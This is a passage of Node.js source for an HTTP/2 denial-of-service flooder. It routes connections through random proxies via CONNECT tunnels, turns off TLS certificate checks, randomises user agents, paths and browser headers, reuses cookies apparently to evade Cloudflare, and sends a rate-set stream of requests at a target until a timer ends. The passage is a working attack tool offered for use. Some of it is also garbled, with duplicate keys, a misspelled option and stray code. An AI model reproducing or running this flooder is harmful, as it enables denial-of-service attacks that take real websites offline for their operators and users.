} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
var hd={}
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 //headers["X-Forwarded-For"] = spoofed;
 //headers["X-Forwarded-Host"] = spoofed;
 //headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = pi;
 //headers["origin"] = "https://" + parsedTarget.host;
 //headers["referer"] = "https://" + parsedTarget.host;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = randstr(15);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 //headers["Trailer"] = "Max-Forwards";
 headers["set-cookie"] = CookieCf;
 headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 

const h2s = {
 [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
 [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path,
 [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
 [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
 [http2.constants.HTTP2_HEADER_USER_AGENT]: getRandomUserAgent(),
 [http2.constants.HTTP2_HEADER_ACCEPT]: accept_header[Math.floor(Math.random() * accept_header.length)],
 [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: Generate_encoding[Math.floor(Math.random() * Generate_encoding.length)],
 [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: 'no-cache',
 };
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['http/1.1', 'h2'],
            sigals: "RSA+SHA256:ECDSA+SHA256",
            socket: connection,
            ecdhCurve: "auto",
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
            session: crypto.randomBytes(64),
            timeout: 1000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxConcurrentStreams: 100,
            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            enablePush: false
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxConcurrentStreams: 100,
            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            enablePush: false,
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                  ...headers,
                  "user-agent": uap1 + randstr(12),
                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                };
                for (let i = 0; i < args.Rate; i++) {
                    headers["ja3"] = jar;
                    const request = client.request(dynHeaders)
                    
                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);